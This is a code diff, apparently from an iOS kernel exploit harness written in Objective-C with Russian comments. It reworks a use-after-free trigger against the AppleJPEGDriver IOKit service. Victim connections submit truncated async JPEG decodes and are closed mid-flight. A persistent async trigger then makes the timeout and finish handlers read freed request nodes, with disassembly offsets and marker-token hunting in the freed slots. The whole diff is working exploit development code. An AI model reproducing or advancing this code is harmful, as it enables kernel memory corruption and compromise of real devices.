@@ -5497,52 +5497,36 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  %@: токен %#llx найден %d раз", tag, (unsigned long long)marker, hits]);
     };
 
-    // Phase 1: victim-only — submit async, close mid-flight, NO reclaim. The
-    // reclaim phase from the previous version was masking the bug: it refills
-    // the freed slot with a valid object before the stale node is read, so
-    // fullSpeedRequestExist always sees a live request. For the MTE fault we
-    // need the stale node to read the FREED (FEEDFACE-poisoned) slot raw.
-    // Раунд-10 (по kernelcache 18.6): queue_io_gated (0x91d2ce0) ходит по
-    // списку запросов драйвера ([driver+0x150]) при КАЖДОМ новом submit —
-    // значит stale-нода читается сразу от любого нового decode, не надо ждать
-    // HW-таймаут. Поэтому: (а) V_REQS 8→12 (больше in-flight в момент close),
-    // (б) быстрый sync-триггер валидным JPEG сразу после каждого close —
-    // queue-walk по stale-списку немедленно, краш за миллисекунды, а не за 10с.
-    // Reclaim-спрей на 18.6: JpegRequest живёт в typed kalloc zone
-    // (kalloc_type site 'JpegRequest', alloc ≥0x448) — чужие объекты
-    // (IOSurface/data) в эту зону НЕ попадут, reclaim = только новые decode.
-    const int CYCLES = 60, V_REQS = 12;
+    // Раунд-12 (дизассембл 18.6): close ХОДИТ по очередям и корректно удаляет
+    // запросы клиента (поэтому маркер-скан находил 0); sync-триггер (token==0)
+    // падает kIOReturnNotReady при занятом engine ДО постановки в очередь и
+    // по списку не ходит. Баг живёт в pool/timeout-колее: victim шлёт async с
+    // TRUNCATED JPEG (без EOI — HW висит до таймаута), close пока висит →
+    // pool_free без dequeue; stale-ноду читает timeout/finish workloop
+    // (finish_io_gated 0x91d0fc0 / timeout 0x91de4a4). Триггер = ASYNC
+    // (token≠0) на persistent-коннекшене.
+    const int CYCLES = 40, V_REQS = 12;
     int victimTotal = 0;
     BOOL healthy = YES;
-    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async, 3мс окно, close) + быстрый sync-триггер после КАЖДОГО close (queue-walk по stale-ноде сразу) ---", CYCLES, V_REQS]);
+
+    // Persistent trigger-коннекшен: async-декоды валидного JPEG (token≠0) —
+    // их finish-путь перечитывает список запросов, включая stale-ноды.
+    io_connect_t trig = 0;
+    BOOL trigOK = (IOServiceOpen(svc, mach_task_self(), 0, &trig) == KERN_SUCCESS && trig);
+    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async TRUNCATED → HW висит, close) + ASYNC-триггер на persistent conn=%@ ---",
+               CYCLES, V_REQS, trigOK ? [NSString stringWithFormat:@"0x%x", trig] : @"НЕ ОТКРЫЛСЯ"]);
+    uint64_t trigTok = 0x4142000000CAFE00ULL;
     for (int c = 0; c < CYCLES; c++) {
         io_connect_t victim = 0;
         kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
         if (kr == KERN_SUCCESS && victim) {
-            victimTotal += kpJSubmitAsync(victim, srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
-            usleep(3000); // in-flight окно: HW жуёт, close роняет mid-decode
-            IOServiceClose(victim);
+            victimTotal += kpJSubmitAsync(victim, srcBadID ? srcBadID : srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
+            usleep(1000); // запросы ушли на HW; truncated = висят до таймаута
+            IOServiceClose(victim);   // pool_free без dequeue — close HW-пул не трогает
         }
-        // Быстрый триггер: sync decode валидного JPEG на свежем коннекшене —
-        // queue_io_gated перечитывает список запросов (в т.ч. stale-ноду victim'а)
-        // при постановке нового запроса. Не ждём таймаут.
-        io_connect_t qt = 0;
-        if (IOServiceOpen(svc, mach_task_self(), 0, &qt) == KERN_SUCCESS && qt) {
-            KPJIosStruct in = {0}, out = {0};
-            in.sourceID    = srcID;
-            in.field_04    = W * H;
-            in.destID      = dstID;
-            in.field_0C    = W * H * 4;
-            in.width       = W;
-            in.height      = H;
-            in.outWidth    = W;
-            in.outHeight   = H;
-            in.subsampling = 3;
-            in.asyncToken  = 0;
-            size_t os = sizeof(out);
-            kern_return_t qkr = IOConnectCallStructMethod(qt, 1, &in, sizeof(in), &out, &os);
-            if (c < 3) kpNote(r, [NSString stringWithFormat:@"    quick-trigger[%d]: kr=0x%x", c, qkr]);
-            IOServiceClose(qt);
+        if (trigOK) {
+            trigTok += 0x100;
+            kpJSubmitAsync(trig, srcID, dstID, W, H, 2, trigTok, r);
         }
         if ((c + 1) % 10 == 0) {
             io_connect_t hc = 0;
@@ -5557,35 +5541,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
     }
 
-    // Phase 2: sync trigger from 8 parallel threads — progressive JPEG +
-    // thread contention stretches decode latency toward the 10s timeout
-    // (pool_free without dequeue → stale node read raw).
-    kpNote(r, @"  --- sync trigger: 8 тредов × 5 sync decode (progressive, конкуренция → таймаут) ---");
-    dispatch_group_t grp = dispatch_group_create();
-    for (int t = 0; t < 8; t++) {
-        dispatch_group_async(grp, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            for (int i = 0; i < 5; i++) {
-                io_connect_t tc = 0;
-                if (IOServiceOpen(svc, mach_task_self(), 0, &tc) != KERN_SUCCESS || !tc) continue;
-                KPJIosStruct in = {0}, out = {0};
-                in.sourceID    = srcBadID ? srcBadID : srcID;
-                in.field_04    = W * H;
-                in.destID      = dstID;
-                in.field_0C    = W * H * 4;
-                in.width       = W;
-                in.height      = H;
-                in.outWidth    = W;
-                in.outHeight   = H;
-                in.subsampling = 3;
-                in.asyncToken  = 0;
-                size_t os = sizeof(out);
-                kern_return_t kr = IOConnectCallStructMethod(tc, 1, &in, sizeof(in), &out, &os);
-                if (t == 0 && i < 3) kpNote(r, [NSString stringWithFormat:@"    sync[t0/%d]: kr=0x%x", i, kr]);
-                IOServiceClose(tc);
-            }
-        });
+    // Волна таймаутов: truncated-декоды victim'ов отваливаются по HW-таймауту,
+    // timeout-handler читает pool_free'd ноды. ~12с с async-пинками триггера.
+    kpNote(r, @"  --- жду волну HW-таймаутов (~12с), async-триггер каждые 500мс (timeout-handler читает stale-ноды) ---");
+    for (int i = 0; i < 24; i++) {
+        usleep(500000);
+        if (trigOK) {
+            trigTok += 0x100;
+            kpJSubmitAsync(trig, srcID, dstID, W, H, 1, trigTok, r);
+        }
+        if (i == 11) kpNote(r, @"  …6с выжидания, живы (паника возможна в любой момент волны)");
     }
-    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC));
+    if (trigOK) IOServiceClose(trig);
     tokenHunt(0x4141000000DEAD00ULL, @"victim-токен (висит ли в freed слоте)");
 
     io_connect_t fc = 0;
@@ -5597,7 +5564,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     if (srcBad) CFRelease(srcBad);
     CFRelease(dstS);
     IOObjectRelease(svc);
-    [r appendString:@"\n=== JPEG UAF: дожили до конца без паники — повторить; паника может быть DEFERRED (открой Camera сам — sync decode дотянет stale node) ===\n"];
+    [r appendString:@"\n=== JPEG UAF: дожили до конца без паники — повторить; паника вероятнее всего в волне HW-таймаутов (timeout-handler читает pool_free'd ноды) ===\n"];
     return r;
 }
 
